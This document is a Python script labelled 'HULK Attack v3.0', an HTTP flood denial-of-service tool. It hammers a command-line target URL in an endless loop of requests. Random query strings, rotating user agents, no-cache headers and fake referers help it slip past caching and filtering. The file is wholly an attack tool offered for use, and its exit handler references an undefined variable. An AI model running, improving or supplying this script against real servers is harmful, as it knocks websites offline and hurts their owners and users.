#!/usr/bin/env python3
import sys
import random
import string
import urllib.request
import urllib.error
from urllib.parse import urlparse

def generate_random_string(length=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def random_useragent():
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
    ]
    return random.choice(user_agents)

def hulk_attack(url):
    print('╔═══════════════════════════════════╗')
    print('║         HULK Attack v3.0          ║')
    print('╚═══════════════════════════════════╝')
    print(f'\n[+] Target: {url}')
    print('[+] Starting attack...\n')
    
    request_count = 0
    
    while True:
        try:
            # Generate random parameters
            param1 = generate_random_string()
            param2 = generate_random_string()
            random_url = f"{url}?{param1}={param2}"
            
            # Random headers
            headers = {
                'User-Agent': random_useragent(),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache',
                'Referer': f'http://www.google.com/?q={generate_random_string()}',
            }
            
            # Create request
            req = urllib.request.Request(random_url, headers=headers)
            
            # Send request
            response = urllib.request.urlopen(req, timeout=5)
            
            request_count += 1
            
            # Show progress
            if request_count % 10 == 0:
                print(f'[*] Requests sent: {request_count}')
            
        except urllib.error.HTTPError as e:
            if request_count % 10 == 0:
                print(f'[!] HTTP Error {e.code} - Requests: {request_count}')
        except urllib.error.URLError as e:
            if request_count % 10 == 0:
                print(f'[!] URL Error - Requests: {request_count}')
        except Exception as e:
            if request_count % 10 == 0:
                print(f'[!] Error - Requests: {request_count}')

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print('Usage: python3 hulk3.py <url>')
        print('Example: python3 hulk3.py http://yourserver.com')
        sys.exit(1)
    
    target_url = sys.argv[1]
    
    # Validate URL
    try:
        result = urlparse(target_url)
        if not all([result.scheme, result.netloc]):
            print('[!] Invalid URL. Please include http:// or https://')
            sys.exit(1)
    except:
        print('[!] Invalid URL format')
        sys.exit(1)
    
    try:
        hulk_attack(target_url)
    except KeyboardInterrupt:
        print('\n\n[!] Attack stopped by user')
        print(f'[+] Total requests sent: {request_count}')
        sys.exit(0)
